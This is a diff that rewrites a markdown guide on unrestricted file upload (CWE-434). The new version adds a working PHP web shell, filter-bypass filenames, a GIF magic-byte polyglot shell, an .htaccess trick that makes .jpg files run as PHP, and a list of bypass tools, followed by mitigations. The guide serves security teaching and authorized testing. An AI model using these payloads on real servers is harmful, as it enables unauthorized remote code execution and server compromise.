@@ -1,31 +1,64 @@
 # What is Unrestricted File Upload?
-Unrestricted File Upload is a security vulnerability that occurs when a web application allows users to upload files without proper validation or restrictions. Attackers exploit this vulnerability by uploading malicious files, which can lead to various security risks, including remote code execution, data leakage, and server compromise.
 
-## How Does Unrestricted File Upload Work?
-- File Upload Functionality: Many web applications allow users to upload files, such as images, documents, or media, for various purposes like profile pictures, attachments, or content submissions.
+Unrestricted File Upload is when an app accepts a file without properly checking its type, content, or where it lands - and then serves or executes it. The worst case is uploading a web shell and getting remote code execution. Even without RCE, weak upload handling leads to stored XSS, SSRF (via SVG/XML), and denial of service.
 
-- No Validation: If the application does not properly validate or restrict the types of files that users can upload, attackers can upload malicious files containing scripts, malware, or executable code.
+## How it works
 
-- Execution: Once uploaded, these malicious files may be executed by the server, depending on how the application processes and serves the uploaded content. This can lead to remote code execution or other security compromises.
+- The app trusts the file extension or the client-supplied `Content-Type`
+- It stores the file inside the web root with its original name
+- Requesting the uploaded file makes the server execute it
 
-## Example Scenario
-Imagine a file upload feature on a social media platform where users can upload profile pictures. If the application fails to validate the file types or content of uploaded files, an attacker could upload a malicious file containing a script disguised as an image. When other users view the attacker's profile, their browsers may execute the script, leading to various security risks.
+## Test payloads
 
-## Impact of Unrestricted File Upload
-- Remote Code Execution: Attackers can upload malicious files containing executable code, leading to remote code execution on the server or client-side browsers.
+```php
+// shell.php - minimal PHP web shell (authorized testing only)
+<?php system($_GET['cmd']); ?>
+```
 
-- Data Leakage: Unrestricted file uploads may allow attackers to upload sensitive files or scripts, leading to data leakage, unauthorized access, or disclosure of confidential information.
+```text
+# Bypass extension filters
+shell.php  ->  shell.phtml, shell.php5, shell.pHp
+shell.php.jpg          (double extension)
+shell.php%00.jpg       (null byte, legacy)
+shell.php;.jpg         (semicolon trick on some stacks)
 
-- Server Compromise: Malicious files uploaded to the server can compromise its integrity, leading to server compromise, service disruption, or unauthorized access to system resources.
+# Bypass Content-Type checks: keep filename malicious but send
+Content-Type: image/png
 
-## Mitigating Unrestricted File Upload
-- File Type Validation: Validate the file types and content of uploaded files to ensure they adhere to acceptable formats and do not contain malicious code or scripts.
+# Add a real magic-byte header so content sniffing passes
+GIF89a; <?php system($_GET['cmd']); ?>
+```
 
-- File Size Limit: Enforce file size limits to prevent the upload of excessively large files that could overwhelm server resources or disrupt service availability.
+```apache
+# .htaccess trick - make the server treat .jpg as PHP
+AddType application/x-httpd-php .jpg
+```
 
-- File Quarantine: Quarantine uploaded files in a secure location and perform antivirus scans to detect and remove any malicious content before processing or serving the files.
+## Tools
 
-- Secure File Storage: Store uploaded files in a secure directory with restricted permissions to prevent unauthorized access or execution.
+- [Burp Suite](https://portswigger.net/burp) - tamper filename, Content-Type, and magic bytes
+- [Upload_Bypass](https://github.com/sAjibuu/Upload_Bypass) - automated upload filter bypass
+- [ffuf](https://github.com/ffuf/ffuf) - brute-force the upload directory to find your file
 
-## Conclusion
-Unrestricted File Upload is a critical security vulnerability that can lead to remote code execution, data leakage, and server compromise. By implementing appropriate security measures such as file type validation, file size limits, file quarantine, and secure file storage, developers can mitigate the risk of exploitation and protect their applications from malicious attacks. Regular security audits, updates, and user education are essential for maintaining a secure file upload feature in web applications.
+## Manual testing
+
+1. Upload a normal image and find where it is stored/served
+2. Swap in a script extension and see whether it is rejected
+3. Work through bypasses: double extension, magic bytes, Content-Type, `.htaccess`
+4. Request the uploaded file and check if code executes
+
+## Mitigation
+
+- Validate with an allowlist of extensions and verify real content type server-side
+- Rename files to random values and strip the original extension
+- Store uploads outside the web root or on a separate, non-executing domain
+- Disable script execution in the upload directory; scan uploads for malware
+
+## Deep dive
+
+- [Unrestricted File Upload - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger file upload labs](https://portswigger.net/web-security/file-upload)
+
+## CWE
+
+- CWE-434: Unrestricted Upload of File with Dangerous Type
